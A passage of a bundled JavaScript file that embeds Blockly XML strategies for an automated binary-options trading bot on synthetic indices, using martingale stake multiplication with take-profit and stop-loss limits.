id="_FQ!rOL~7tg1@W}$8p,:">\n                <field name="VAR" id="e)q23w3jC#7SPFJi_~rC">Prediction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="FmQ7-Aho*:XV/bl((a/]">\n                    <field name="NUM">4</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="yHqo22iH_xRzc,vSq^r]">\n                    <field name="VAR" id="c5=hz$~!=]^.)CA:21Zd">Martangle</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="Ho(2Mt~+G07UT|gMt.7)">\n                        <field name="NUM">2</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="utbpf.ZG81%QCB|b@alh">\n                        <field name="VAR" id=".y;h9Tk8uf./r@9$[8(b">Use Martingale</field>\n                        <value name="VALUE">\n                          <block type="logic_boolean" id="B5g~v+qeB9XG8A+4WEHL">\n                            <field name="BOOL">TRUE</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="suyO~vvnT3;Q(:E-pBQ7">\n                            <field name="VAR" id="|Ag{[(Qw/K$g1v=k)zNh">Take Profit</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="uJG:nXJwJz3pqsI%as9n">\n                                <field name="NUM">5</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="V^l4B)1rr18uay7t|#y]">\n                                <field name="VAR" id="2]oO6`(1|9(H8I5QalfU">Stop Loss</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="iy7vhkZMo!$WjGePxUnp">\n                                    <field name="NUM">30</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="RSlx,kLC5]))K_}),bMX" collapsed="true">\n                                    <field name="VAR" id="TpR#!@ZaN:g6gvsyAgHw">Loop Stop</field>\n                                    <value name="VALUE">\n                                      <block type="logic_boolean" id="SFn9TQ,wOPQJRCdHpBh$">\n                                        <field name="BOOL">FALSE</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="_-f4m{R~cP`bU+7P^|Be" collapsed="true">\n                                        <field name="VAR" id="is-FMy]az2Q0g8j+I|5%">Initial Stake</field>\n                                        <value name="VALUE">\n                                          <block type="variables_get" id="jE}g)qAH%-B$CBPy`LFc">\n                                            <field name="VAR" id="L@/b)sz/N}%09a72BPX;">Stake</field>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="controls_whileUntil" id="JmN`%0FI|Tj}~EJJW8v," collapsed="true">\n        <field name="MODE">UNTIL</field>\n        <value name="BOOL">\n          <block type="logic_compare" id="$`8;9;,@0hU9Tazn.hBz">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="Q$n#81Q?QrsjLO*Z*9ta">\n                <field name="VAR" id="TpR#!@ZaN:g6gvsyAgHw">Loop Stop</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="logic_boolean" id="=gx3N:10By9=w2g!}XK_">\n                <field name="BOOL">TRUE</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO">\n          <block type="timeout" id="hE!54w{MwB3`Cye+%]EP">\n            <statement name="TIMEOUTSTACK">\n              <block type="controls_if" id="NOQZD!PgXK@$-n^?GZ8v">\n                <value name="IF0">\n                  <block type="logic_compare" id="T0y1@Y/_5W.iObAP_b1d">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="last_digit" id="Bw]PXul)+_yyLVF2Fk2n"></block>\n                    </value>\n                    <value name="B">\n                      <block type="variables_get" id="Gv_4+.M7MSHbNfm5O2?4">\n                        <field name="VAR" id="kaNuTZZg#6WA.4h*oV^=">Entry Point</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="variables_set" id="*Qh5_G%p}sMPp~,9QA1)">\n                    <field name="VAR" id="TpR#!@ZaN:g6gvsyAgHw">Loop Stop</field>\n                    <value name="VALUE">\n                      <block type="logic_boolean" id="+z#:!!wOB,?eU9Z53e)_">\n                        <field name="BOOL">TRUE</field>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <next>\n                  <block type="notify" id=":YNEsXX}^?l2TICEj(@|">\n                    <field name="NOTIFICATION_TYPE">info</field>\n                    <field name="NOTIFICATION_SOUND">silent</field>\n                    <value name="MESSAGE">\n                      <shadow type="text" id="#8Vmk-C%,fvsXp;#)q.`">\n                        <field name="TEXT">abc</field>\n                      </shadow>\n                      <block type="last_digit" id="`gH;FIZSX0jY(tdMP%f0"></block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="SECONDS">\n              <block type="math_number" id="d?Gm~jz:U2U5mu#U)DM,">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </statement>\n        <next>\n          <block type="trade_definition_tradeoptions" id="ZX}~CNjTLNB`G}x2}_$8">\n            <mutation xmlns="http://www.w3.org/1999/xhtml" has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n            <field name="DURATIONTYPE_LIST">t</field>\n            <value name="DURATION">\n              <shadow type="math_number_positive" id="cIkks,]*FLjcfZb2crUZ">\n                <field name="NUM">1</field>\n              </shadow>\n            </value>\n            <value name="AMOUNT">\n              <shadow type="math_number_positive" id="2g`WGIcgV/XT+J-vXw34">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="variables_get" id="jXlZ2R)![);/:3VaXFDa">\n                <field name="VAR" id="L@/b)sz/N}%09a72BPX;">Stake</field>\n              </block>\n            </value>\n            <value name="PREDICTION">\n              <shadow type="math_number_positive" id="E6Jm:qL5(@mB?t@~f3Cn" inline="true">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="variables_get" id="{KhwHcFHd!rt}Q.L{$HC">\n                <field name="VAR" id="e)q23w3jC#7SPFJi_~rC">Prediction</field>\n              </block>\n            </value>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="(^qi7LaqxU`[;j[JOf%`" collapsed="true" x="893" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id=",%V@C))a-7h$1iVQ3.]l">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n        <value name="IF0">\n          <block type="contract_check_result" id="`3UmoRHO^YE_^CfmrKIR">\n            <field name="CHECK_RESULT">win</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="variables_set" id="F,6Wc#FQwt!kT](pd#PP">\n            <field name="VAR" id="L@/b)sz/N}%09a72BPX;">Stake</field>\n            <value name="VALUE">\n              <block type="variables_get" id="=aOe[T_mV#.iZR6n3Oj,">\n                <field name="VAR" id="is-FMy]az2Q0g8j+I|5%">Initial Stake</field>\n              </block>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="XGnxfvO}}Yb:s^rJ@hTS">\n            <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id="M{=7*w]J$uDx[FL%J.[g">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="BQb-b9;+xklt-D%R5%BA">\n                    <field name="VAR" id=".y;h9Tk8uf./r@9$[8(b">Use Martingale</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="logic_boolean" id="69S:X_hK-(-Z@,+9O[Ea">\n                    <field name="BOOL">TRUE</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="variables_set" id="T@*tC_F%5zGGgH(O:tY?">\n                <field name="VAR" id="L@/b)sz/N}%09a72BPX;">Stake</field>\n                <value name="VALUE">\n                  <block type="math_arithmetic" id="aEc8P{YMMpv,z(bO_)bC">\n                    <field name="OP">MULTIPLY</field>\n                    <value name="A">\n                      <shadow type="math_number" id=";RTPO!3?{1w6v/Z4-zXi">\n                        <field name="NUM">1</field>\n                      </shadow>\n                      <block type="variables_get" id="@d#A^[KvZ=6;4ar1LEa^">\n                        <field name="VAR" id="L@/b)sz/N}%09a72BPX;">Stake</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <shadow type="math_number" id="L]Yfa.JY*IZnaX9yE[OE">\n                        <field name="NUM">1</field>\n                      </shadow>\n                      <block type="variables_get" id="VSLc}/Gpb/:4L;z~kx#_">\n                        <field name="VAR" id="c5=hz$~!=]^.)CA:21Zd">Martangle</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="-tL_w@e?;#:^r!PvRiSx">\n                <field name="VAR" id="L@/b)sz/N}%09a72BPX;">Stake</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="sIvz|e7c*yz?lGI)OU|t">\n                    <field name="VAR" id="is-FMy]az2Q0g8j+I|5%">Initial Stake</field>\n                  </block>\n                </value>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <next>\n          <block type="controls_if" id="(_A)U})Z#q1M-|1NWArN">\n            <mutation xmlns="http://www.w3.org/1999/xhtml" elseif="1" else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id="#Wtl;*Jf6q~|KaUWHb9P">\n                <field name="OP">GTE</field>\n                <value name="A">\n                  <block type="total_profit" id="e#nxa]-4OpAT9HuGgUN3"></block>\n                </value>\n                <value name="B">\n                  <block type="variables_get" id="@/KbtsDZiHT,3TF7wdK-">\n                    <field name="VAR" id="|Ag{[(Qw/K$g1v=k)zNh">Take Profit</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="text_print" id="@v8WcZ||FY{FUP`StW!0">\n                <value name="TEXT">\n                  <shadow type="text" id="*vK$Q8+#c6JRxl3uiL#K">\n                    <field name="TEXT">Congratulations!!! Take Profit Hit</field>\n                  </shadow>\n                </value>\n              </block>\n            </statement>\n            <value name="IF1">\n              <block type="logic_compare" id="nxOAs7L-pD#|M)JgPu:S">\n                <field name="OP">LTE</field>\n                <value name="A">\n                  <block type="total_profit" id="9y1,uTwPtVZeX?Aoz^$1"></block>\n                </value>\n                <value name="B">\n                  <block type="math_single" id="eQn5=+-q@mR@Kw9?{XDJ">\n                    <field name="OP">NEG</field>\n                    <value name="NUM">\n                      <shadow type="math_number" id="^xCu}{o)v|?{P$#Axwk3">\n                        <field name="NUM">9</field>\n                      </shadow>\n                      <block type="variables_get" id="*lWiga[U=~M:3QI+#T=I">\n                        <field name="VAR" id="2]oO6`(1|9(H8I5QalfU">Stop Loss</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="text_print" id="nH_3y8aG(M{[aX3=I[3w">\n                <value name="TEXT">\n                  <shadow type="text" id="CrUgTBg!%^X,A[dN-U.g">\n                    <field name="TEXT">Sorry!!! Stop Loss Hit</field>\n                  </shadow>\n                </value>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="trade_again" id="tb|5z)8[MTxNZ`:%-k+e"></block>\n            </statement>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="licmPn={lrajX{,il-1Y" deletable="false" x="0" y="1122">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="apollo_purchase" id="g0$#P)s}l;60LDPCzx1`">\n        <field name="PURCHASE_LIST">DIGITOVER</field>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            76485: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="*S5@jR!:6fNu_jGh29XP" islocal="false" iscloud="false">Target Profit</variable>\n    <variable type="" id="#zfdvs@F;$O(rYcB/,RJ" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="l/g[COS_p$y={!V:[u*:" islocal="false" iscloud="false">First Stake</variable>\n    <variable type="" id="}PYb?[K00*b[IHmPgA7k" islocal="false" iscloud="false">Martingale Factor</variable>\n    <variable type="" id="X#UMfnUF|OeyRcxIN~Y4" islocal="false" iscloud="false">Martingale Level</variable>\n    <variable type="" id="-sYH8a;P)v}g?!iatjL," islocal="false" iscloud="false">Do Martingale After</variable>\n    <variable type="" id="BPsrb}:o?nCP7t]1@Rfq" islocal="false" iscloud="false">[Win Result]</variable>\n    <variable type="" id="dK=o~;7~9dr8wCZ%hyh," islocal="false" iscloud="false">Detail Profit</variable>\n    <variable type="" id="ddH0?/^#_8u1VjM/!`t|" islocal="false" iscloud="false">Profit</variable>\n    <variable type="" id="#S5]i9_E6vE_6t^_dYeJ" islocal="false" iscloud="false">Continue</variable>\n    <variable type="" id="RMbK)by1LEnp^9@HKC(*" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="k:EcRUy)u-26FkWUoszO" islocal="false" iscloud="false">FirstStake</variable>\n    <variable type="" id="!c%d*XBHYNv0h]4+]*nj" islocal="false" iscloud="false">TargetProfit</variable>\n    <variable type="" id="RRH]M7%0M)Zi;ridyo7}" islocal="false" iscloud="false">Win Count</variable>\n    <variable type="" id="^(Gy/YRFAMn6r6Ekap/J" islocal="false" iscloud="false">Loss Count</variable>\n    <variable type="" id="m(@~SI$PI9_=9gVd*zl9" islocal="false" iscloud="false">Stoploss</variable>\n    <variable type="" id="[~%IWPApAWAU4`63rDfr" islocal="false" iscloud="false">MartiLossLevel</variable>\n    <variable type="" id="ezm;s,8YY7`S_pxNx+{s" islocal="false" iscloud="false">MartiFactor</variable>\n    <variable type="" id="/VJ7O.)sAJmm47`,|W=v" islocal="false" iscloud="false">Loss Level</variable>\n    <variable type="" id="Nxx}Lsm5Mjf|D~2!Dj%V" islocal="false" iscloud="false">MartiStart</variable>\n    <variable type="" id="0+2#g0Tyh=0b=a(l6T@n" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="JIZO[e-A^9:9$zy?Kuw-" islocal="false" iscloud="false">text1</variable>\n    <variable type="" id="umJ^/{8q8p55:]m_8J^^" islocal="false" iscloud="false">text2</variable>\n    <variable type="" id=":A(nDZDt5~/IS:5Q7?jx" islocal="false" iscloud="false">text3</variable>\n  </variables>\n  <block type="trade_definition" id="/x_@CLlCS^G^#AyDs=HT" deletable="false" x="0" y="0">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="Rzmw$jP6|=me%`BiOh)q" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="d}hrB!ZF!]yev+5!Ib2G" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">callput</field>\n            <field name="TRADETYPE_LIST">callput</field>\n            <next>\n              <block type="trade_definition_contracttype" id="R|7eJ^85+SiP`z1[Z)^O" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="HK(?MF0V2Ix!gIo5`K3L" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="9[7aOA!Aw=18%#g@@`zf" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="W}=HD~WV}a9ww;jHuOO=" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="procedures_callnoreturn" id="eP/^XD=g@h_l8kgpnWV`">\n        <mutation name="Daily Profit\'s System">\n          <arg name="Target Profit"></arg>\n          <arg name="Stop Loss"></arg>\n          <arg name="First Stake"></arg>\n          <arg name="Martingale Factor"></arg>\n          <arg name="Martingale Level"></arg>\n          <arg name="Do Martingale After"></arg>\n        </mutation>\n        <value name="ARG0">\n          <block type="math_number" id="yvjGDiLTH9{oE}E[Ugcr">\n            <field name="NUM">10</field>\n          </block>\n        </value>\n        <value name="ARG1">\n          <block type="math_number" id="wf/G-u}1:C]]HmvYUAU7">\n            <field name="NUM">100</field>\n          </block>\n        </value>\n        <value name="ARG2">\n          <block type="math_number" id="nyccI$!UUt/Fhbdj{GG;">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n        <value name="ARG3">\n          <block type="math_number" id="EA{iVZBt2Y}Bv8vQO[)O">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n        <value name="ARG4">\n          <block type="math_number" id="k?60Te%+I(Bv-z`S4B*/">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n        <value name="ARG5">\n          <block type="math_number" id="hGY_gUl}p^8`8fdLRm3N">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id=";[Ns/i15.H[/Q/[h*?%^" collapsed="true">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="false"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id="Ia#w0tyx*0+vf=EH{:TA">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number" id="f#sNG`I(V*^T)Mb3;!n.">\n            <field name="NUM">0.35</field>\n          </shadow>\n          <block type="variables_get" id="MpL156$Kf4FnXUmr2:Lj">\n            <field name="VAR" id="RMbK)by1LEnp^9@HKC(*" variabletype="">Stake</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="Zc4VeKaW1/F_j$%QK^.H" x="1466" y="0">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="!RqD2`C:Q/FssWS`ZiMX">\n        <value name="IF0">\n          <block type="procedures_callreturn" id="$f6^)PtfgsT51EC]w6ar">\n            <mutation name="Daily Profit\'s Trade Again">\n              <arg name="[Win Result]"></arg>\n              <arg name="Detail Profit"></arg>\n            </mutation>\n            <value name="ARG0">\n              <block type="contract_check_result" id=")C[@1{;gA)zxX(%Job7)">\n                <field name="CHECK_RESULT">win</field>\n              </block>\n            </value>\n            <value name="ARG1">\n              <block type="read_details" id="3!Y}DH=?uR?e%[/|bF$-">\n                <field name="DETAIL_INDEX">4</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="trade_again" id="=It{G{[c{NMlDVo{(iWL"></block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_callnoreturn" id="vzo!]3ykF}2Hp36DN=x/" disabled="true" x="64" y="472">\n    <mutation name="Daily Profit\'s System">\n      <arg name="Target Profit"></arg>\n      <arg name="Stop Loss"></arg>\n      <arg name="First Stake"></arg>\n      <arg name="Martingale Factor"></arg>\n      <arg name="Martingale Level"></arg>\n      <arg name="Do Martingale After"></arg>\n    </mutation>\n    <data>0K~#d=SgPPum#y256eqo</data>\n    <value name="ARG0">\n      <block type="math_number" id="@7(vScp9C/6uIpW[zN73">\n        <field name="NUM">10</field>\n      </block>\n    </value>\n    <value name="ARG1">\n      <block type="math_number" id="lbeNf6eQGX4T@z|a9aBE">\n        <field name="NUM">100</field>\n      </block>\n    </value>\n    <value name="ARG2">\n      <block type="math_number" id=":}S#9;zy~RW_yKA5`$[F">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG3">\n      <block type="math_number" id="-K]wqv?n}0#B0}.4sp,w">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG4">\n      <block type="math_number" id="VvLnVdgt#Kjo[;sxN;.w">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG5">\n      <block type="math_number" id="L?Dg^hvP^MSrzCIA^;/D">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n  </block>\n  <block type="procedures_callnoreturn" id="oLme2Pw2dydCe-N)XId-" disabled="true" x="112" y="568">\n    <mutation name="Daily Profit\'s System">\n      <arg name="Target Profit"></arg>\n      <arg name="Stop Loss"></arg>\n      <arg name="First Stake"></arg>\n      <arg name="Martingale Factor"></arg>\n      <arg name="Martingale Level"></arg>\n      <arg name="Do Martingale After"></arg>\n    </mutation>\n    <data>0K~#d=SgPPum#y256eqo</data>\n    <value name="ARG0">\n      <block type="math_number" id="JTmXQ@Gaq6T;-pkH$W%u">\n        <field name="NUM">10</field>\n      </block>\n    </value>\n    <value name="ARG1">\n      <block type="math_number" id="M7nN=S^(}I.F_G1}ej?)">\n        <field name="NUM">100</field>\n      </block>\n    </value>\n    <value name="ARG2">\n      <block type="math_number" id="8C$ytWV8qA)N,iP#]KE{">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG3">\n      <block type="math_number" id="DnYdq!J+F9);M@]8VRw@">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG4">\n      <block type="math_number" id="0#JtQ$!T5yg8*|uTY]f|">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG5">\n      <block type="math_number" id="|4,!W{`wGIBbnAOR:lqz">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n  </block>\n  <block type="before_purchase" id="WKBhcIx=}gmy*a5P*vga" deletable="false" x="0" y="600">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="purchase" id=",{0hGLktcVm;D_NDd`$U">\n        <field name="PURCHASE_LIST">CALL</field>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_callnoreturn" id="}12X9)N=@4n3U@.Z9X6s" disabled="true" x="160" y="664">\n    <mutation name="Daily Profit\'s System">\n      <arg name="Target Profit"></arg>\n      <arg name="Stop Loss"></arg>\n      <arg name="First Stake"></arg>\n      <arg name="Martingale Factor"></arg>\n      <arg name="Martingale Level"></arg>\n      <arg name="Do Martingale After"></arg>\n    </mutation>\n    <data>0K~#d=SgPPum#y256eqo</data>\n    <value name="ARG0">\n      <block type="math_number" id="[2Q-ntHYDTrx#NuAw~bv">\n        <field name="NUM">10</field>\n      </block>\n    </value>\n    <value name="ARG1">\n      <block type="math_number" id="VH-})f{{?VL;wzBj-G[.">\n        <field name="NUM">100</field>\n      </block>\n    </value>\n    <value name="ARG2">\n      <block type="math_number" id="7@$^2a-wH$DHprsz6@SB">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG3">\n      <block type="math_number" id="{$O3q-q.UNuZ5+]8(A6x">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG4">\n      <block type="math_number" id="SWaom=1T8#NCkL]ZTR3f">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG5">\n      <block type="math_number" id="Cn6O=]21Z~qe($M,UDh7">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n  </block>\n  <block type="procedures_callnoreturn" id="O0=kE3}}T*#5%;KgTzCO" disabled="true" x="208" y="760">\n    <mutation name="Daily Profit\'s System">\n      <arg name="Target Profit"></arg>\n      <arg name="Stop Loss"></arg>\n      <arg name="First Stake"></arg>\n      <arg name="Martingale Factor"></arg>\n      <arg name="Martingale Level"></arg>\n      <arg name="Do Martingale After"></arg>\n    </mutation>\n    <data>0K~#d=SgPPum#y256eqo</data>\n    <value name="ARG0">\n      <block type="math_number" id="tUWrSF*@2Y,vWM]j)/kY">\n        <field name="NUM">10</field>\n      </block>\n    </value>\n    <value name="ARG1">\n      <block type="math_number" id="]PVj+CtBzg5g_!ex0[i9">\n        <field name="NUM">100</field>\n      </block>\n    </value>\n    <value name="ARG2">\n      <block type="math_number" id="^2A-w[${Y@en}ct;0A5z">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG3">\n      <block type="math_number" id="scP.(2`;olg((PL:Lc~.">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG4">\n      <block type="math_number" id="2DW-SApsMYXnGpAK5[zr">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG5">\n      <block type="math_number" id="{7xWYvmY+IwrEQS+z~#u">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n  </block>\n  <block type="procedures_defnoreturn" id="0K~#d=SgPPum#y256eqo" collapsed="true" x="0" y="784">\n    <mutation>\n      <arg name="Target Profit" varid="*S5@jR!:6fNu_jGh29XP"></arg>\n      <arg name="Stop Loss" varid="#zfdvs@F;$O(rYcB/,RJ"></arg>\n      <arg name="First Stake" varid="l/g[COS_p$y={!V:[u*:"></arg>\n      <arg name="Martingale Factor" varid="}PYb?[K00*b[IHmPgA7k"></arg>\n      <arg name="Martingale Level" varid="X#UMfnUF|OeyRcxIN~Y4"></arg>\n      <arg name="Do Martingale After" varid="-sYH8a;P)v}g?!iatjL,"></arg>\n    </mutation>\n    <field name="NAME">Daily Profit\'s System</field>\n    <comment id="Wh.xm@icPD462.ASIrcx" pinned="true" h="200" w="200" x="0" y="784" minimized="true">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="notify" id="-%6nFwy*F:aM*#k^1y7a">\n        <field name="NOTIFICATION_TYPE">info</field>\n        <field name="NOTIFICATION_SOUND">silent</field>\n        <value name="MESSAGE">\n          <block type="text" id="]:kuR~GaXPw7DW0I[;?+">\n            <field name="TEXT">Bot Starts! Good Luck! - Daily Profit Corp</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="FK:0+AQ#Xm3b_c8yCjg~">\n            <field name="VAR" id="k:EcRUy)u-26FkWUoszO" variabletype="">FirstStake</field>\n            <value name="VALUE">\n              <block type="variables_get" id="o[~4NPU:qT~Gf~qN^Hb:">\n                <field name="VAR" id="l/g[COS_p$y={!V:[u*:" variabletype="">First Stake</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="]c;1Qn#xTYu$LCY.~{E8">\n                <field name="VAR" id="RMbK)by1LEnp^9@HKC(*" variabletype="">Stake</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="gqYA6#u4o?d-)e:If0^e">\n                    <field name="VAR" id="l/g[COS_p$y={!V:[u*:" variabletype="">First Stake</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="H7jQnKes9v9@poKnee+/">\n                    <field name="VAR" id="!c%d*XBHYNv0h]4+]*nj" variabletype="">TargetProfit</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id=")J)P;SGCBK@aXtzry%Bl">\n                        <field name="VAR" id="*S5@jR!:6fNu_jGh29XP" variabletype="">Target Profit</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="a~|x/tO,h~*MRjXAhtia">\n                        <field name="VAR" id="m(@~SI$PI9_=9gVd*zl9" variabletype="">Stoploss</field>\n                        <value name="VALUE">\n                          <block type="math_single" id="ehNR.a($,b3a4TdLmKc|">\n                            <field name="OP">NEG</field>\n                            <value name="NUM">\n                              <shadow type="math_number" id="a#EOH-`e?ITu_2)M~c(3">\n                                <field name="NUM">9</field>\n                              </shadow>\n                              <block type="math_single" id="S|}BCaq_204Rvz,S]aI$">\n                                <field name="OP">ABS</field>\n                                <value name="NUM">\n                                  <shadow type="math_number" id="6C^OC8t3fLX=E?Xorl,|">\n                                    <field name="NUM">9</field>\n                                  </shadow>\n                                  <block type="variables_get" id="qf(+M/u?-d_`Sr~WuWy2">\n                                    <field name="VAR" id="#zfdvs@F;$O(rYcB/,RJ" variabletype="">Stop Loss</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="nzLcTYPf$wX#ee9KFJlH">\n                            <field name="VAR" id="[~%IWPApAWAU4`63rDfr" variabletype="">MartiLossLevel</field>\n                            <value name="VALUE">\n                              <block type="variables_get" id="t=jUw^R^Sd)*C4cc^LMF">\n                                <field name="VAR" id="X#UMfnUF|OeyRcxIN~Y4" variabletype="">Martingale Level</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="ll=D95@(FTWIUU:0@zLm">\n                                <field name="VAR" id="ezm;s,8YY7`S_pxNx+{s" variabletype="">MartiFactor</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="NgX}_dB=+|CRw0VK*QF,">\n                                    <field name="VAR" id="}PYb?[K00*b[IHmPgA7k" variabletype="">Martingale Factor</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="[28Q_oQ[]10,^FdA(u{U">\n                                    <field name="VAR" id="Nxx}Lsm5Mjf|D~2!Dj%V" variabletype="">MartiStart</field>\n                                    <value name="VALUE">\n                                      <block type="variables_get" id="!U.@if5AS0F7HhIj_@{$">\n                                        <field name="VAR" id="-sYH8a;P)v}g?!iatjL," variabletype="">Do Martingale After</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="oLYF$ur@|V_gP{!~*Tj$">\n                                        <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                                        <value name="VALUE">\n                                          <block type="math_number" id="mZAm[gJTC.)}sXt_8QHD">\n                                            <field name="NUM">0</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="variables_set" id="?N,~1!Z.*QdXD,a`*VB#">\n                                            <field name="VAR" id="RRH]M7%0M)Zi;ridyo7}" variabletype="">Win Count</field>\n                                            <value name="VALUE">\n                                              <block type="math_number" id="_VCTB+^oqu3qCM;2%V-+">\n                                                <field name="NUM">0</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="variables_set" 